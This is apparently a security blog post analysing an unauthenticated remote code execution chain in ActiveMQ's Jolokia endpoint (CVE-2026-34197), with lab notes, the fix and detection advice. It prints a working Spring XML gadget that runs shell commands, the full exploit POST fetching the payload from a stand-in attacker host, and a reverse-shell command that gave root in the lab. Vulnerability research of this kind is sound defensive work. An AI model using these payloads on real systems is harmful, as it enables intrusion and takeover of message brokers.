---
layout: post
title: "When JMX Meets Spring: ActiveMQ Jolokia RCE (CVE-2026-34197)"
date: 2026-04-28
categories: [vulnerability-analysis, rce]
tags: [cve-2026-34197, activemq, jolokia, rce, spring, cisa-kev]
cve: CVE-2026-34197
cvss: "9.8 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
affected: "ActiveMQ 6.0.0 - 6.1.1"
fixed: "6.1.2+"
cwe: "CWE-94 (Code Injection)"
author: P1ck
---

Some vulnerabilities are subtle. Memory corruption, race conditions, cryptographic
flaws -- these require patient reverse engineering, deep understanding of the target,
and a bit of luck.

Then there's CVE-2026-34197. Where you send a single HTTP POST to a REST API and the
broker fetches your malicious XML, hands it to Spring, and executes whatever you put
in it. No memory corruption. No bypass. Just a chain of legitimate features that should
never have been combined.

CISA added it to the Known Exploited Vulnerabilities catalog. ActiveMQ 6.1.2 shipped
the fix. Here's how it works, why it works, and what we learned breaking it in a lab.

## The Moving Parts

Three components line up to make this work.

**Jolokia** is a JMX-over-HTTP bridge. ActiveMQ exposes it at `/api/jolokia/`. It lets
you call any JMX MBean operation via JSON. That's by design -- it's how monitoring
dashboards talk to the broker.

**`addNetworkConnector()`** is a JMX operation on the ActiveMQ broker MBean. You call
it with a URI string, and ActiveMQ creates a network connector to another broker.
Useful for federating messages across data centers. The operation accepts arbitrary
URI schemes, including `vm://` (in-JVM transport).

**Spring XML remote loading** is where things go sideways. When the `vm://` URI
contains a `brokerConfig=xbean:http://...` parameter, ActiveMQ calls
`BrokerFactory.createBroker()`. The `xbean:` prefix tells it to fetch a Spring XML
file from that URL and instantiate every bean defined in it.

Put those three together: an HTTP request triggers a JMX call that triggers an HTTP
fetch that triggers arbitrary Java method invocation. It's not an exploit. It's a
feature. The vulnerability is that there's nothing stopping you from using it.

## CVE-2024-32114: The Uninvited Guest

ActiveMQ 6.0.0 through 6.1.1 shipped with a bug where `/api/*` paths had no security
constraints in `web.xml`. That means Jolokia -- normally protected by HTTP Basic auth
-- was accessible without any credentials.

On its own, CVE-2024-32114 is an information leak: read-only JMX attributes exposed.
Combined with CVE-2026-34197, it's unauthenticated remote code execution. One HTTP POST,
no credentials, root shell.

## The Gadget

The Spring XML that triggers code execution is almost boringly simple:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetObject">
      <bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetClass" value="java.lang.Runtime"/>
        <property name="targetMethod" value="getRuntime"/>
      </bean>
    </property>
    <property name="targetMethod" value="exec"/>
    <property name="arguments">
      <list>
        <array value-type="java.lang.String">
          <value>/bin/bash</value>
          <value>-c</value>
          <value>id > /tmp/pwned</value>
        </array>
      </list>
    </property>
  </bean>
</beans>
```

`MethodInvokingFactoryBean` is a Spring built-in. You point it at a class and a method,
and it calls it during bean initialization. The outer bean calls `exec()` on the result
of the inner bean, which is `Runtime.getRuntime()`. Two beans, two method calls,
arbitrary command execution.

No ysoserial. No gadget chain hunting. No classpath dependencies. Spring does the work
for you because that's what Spring does -- it instantiates beans.

## The HTTP Request

Everything starts with a single POST:

```json
POST /api/jolokia/
Content-Type: application/json

{
  "type": "exec",
  "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
  "operation": "addNetworkConnector",
  "arguments": ["static:(vm://rce?brokerConfig=xbean:http://ATTACKER:8888/payload.xml)"]
}
```

ActiveMQ receives this, resolves the MBean, calls `addNetworkConnector` with that URI
string. The URI parser extracts the `brokerConfig` parameter. `BrokerFactory` fetches
the XML. Spring parses it. `Runtime.exec()` fires. Done.

The whole chain is synchronous. The Jolokia response comes back after the command has
already executed. If your payload server is slow, the request times out. If it's fast,
you get a 200 OK with `status: 200` in the JSON response. The broker then logs a WARN
about the network connector failing to establish -- but the code already ran.

## Breaking It in Docker

We built a lab with ActiveMQ 6.1.1 and hit seven distinct issues before getting a
clean shell. Here's the shortened war story.

**Java 11 vs 17.** ActiveMQ 6.x targets Java 17 (class file version 61.0). Our
Dockerfile started with `eclipse-temurin:11-jdk`. The container crashed immediately
with `UnsupportedClassVersionError`. Lesson: check the class file version table.
52 = Java 8, 55 = Java 11, 61 = Java 17.

**Jetty binding.** ActiveMQ 6.x binds its web console to `127.0.0.1:8161` by default.
Inside a Docker container, that's loopback only. Port mapping (`-p 8161:8161`) forwards
to the container's network interface, which isn't loopback. `curl` from the host gets
nothing. Fixed by patching `jetty.xml` to bind `0.0.0.0`.

**Jolokia CORS.** ActiveMQ 6.x ships `jolokia-access.xml` with strict origin checking.
curl without an `Origin` header sends `Origin: null`, which gets rejected with 403.
Fixed by widening the allow-origin policy in the lab config and adding `Origin` headers
to the PoC.

**Docker networking.** The big one. With the default bridge network, ActiveMQ inside
the container couldn't reach the payload server on the host. `host.docker.internal`
resolved (via `extra_hosts`) but the traffic was blocked by iptables rules on the
Docker bridge. We tried `172.17.0.1`, we tried `host-gateway`, nothing worked.
Final answer: `network_mode: host`. The container shares the host's network stack.
Not suitable for production simulation, but for a vulnerability lab it removes an
entire class of networking headaches.

**XML escaping.** `bash -i >& /dev/tcp/...` works when you type it in a shell. It
fails when embedded in Spring XML because `&` is a special character in XML. The
parser sees `>&` and tries to resolve `>d` as an entity reference. The command gets
silently mangled. `xml.sax.saxutils.escape()` fixed it: `&` becomes `&amp;`, `<`
becomes `&lt;`, `>` becomes `&gt;`. Spring sees the escaped version, resolves the
entities, passes the original string to `bash -c`.

The final working command:

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 poc.py -t 127.0.0.1 \
  --cmd "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" \
  --payload-host 127.0.0.1 --payload-port 9999
```

```bash
$ docker exec cve-2026-34197-activemq cat /tmp/cve-2026-34197-pwned
uid=0(root) gid=0(root) groups=0(root)
```

Root. Because ActiveMQ's default Docker image runs as root.

## Why This Hits Hard

The attack surface is minimal. One HTTP endpoint. No authentication on 6.0.0-6.1.1.
No exploit reliability concerns -- it's not a memory corruption where you need to worry
about ASLR or heap layout. It's an HTTP POST. It works every time.

The Jolokia endpoint is designed to be reachable from monitoring tools. That means
it's often exposed on internal networks, sometimes even on the internet. Shodan finds
thousands of ActiveMQ instances with web consoles exposed.

The `addNetworkConnector` operation isn't guarded by any input validation. It accepts
any string, parses it as a URI, and follows the `brokerConfig` parameter to arbitrary
HTTP URLs. This isn't a design oversight -- it's how the feature works. The fix in
6.1.2 restricts which operations Jolokia can invoke, rather than trying to validate
the URI itself.

## The Fix

ActiveMQ 6.1.2 added an operation whitelist to the Jolokia configuration.
`addNetworkConnector` is no longer callable through the Jolokia REST API. The
underlying JMX operation still exists -- it's just not exposed over HTTP anymore.

CVE-2024-32114 was fixed separately by adding security constraints to `/api/*` in
`web.xml`. If you're on 6.1.2+, both issues are addressed.

If you can't upgrade immediately, restrict access to port 8161 at the network level.
Jolokia has no business being reachable from untrusted networks.

## Detection

**Jolokia access logs**: Look for POST requests to `/api/jolokia/` with
`addNetworkConnector` in the body. In normal operations, this call is extremely rare.

**Outbound HTTP from ActiveMQ**: The broker fetching an external XML file is unusual.
Monitor for outbound connections from the ActiveMQ process to unexpected hosts.

**Spring bean instantiation in logs**: ActiveMQ logs will show network connector
creation attempts followed by WARN-level failures. The command executes before the
connector fails.

**Post-exploitation**: Check for unexpected child processes of the ActiveMQ JVM.
`/proc/<pid>/cmdline` for Linux, process monitoring for Windows.

## Full Lab and PoC

The complete Docker environment, PoC script, and detection rules are in the
[VulnForge repository][vulnforge].

[vulnforge]: https://github.com/P1ck/VulnForge/tree/main/vulnerabilities/activemq/CVE-2026-34197

## References

- [Horizon3.ai Technical Analysis](https://horizon3.ai/attack-research/disclosures/cve-2026-34197-activemq-rce-jolokia/)
- [Apache ActiveMQ Security Advisory](https://activemq.apache.org/security-advisories.data/CVE-2026-34197-announcement.txt)
- [NVD: CVE-2026-34197](https://nvd.nist.gov/vuln/detail/CVE-2026-34197)
- [SecurityOnline Analysis](https://securityonline.info/activemq-rce-jolokia-spring-injection-cve-2026-34197/)
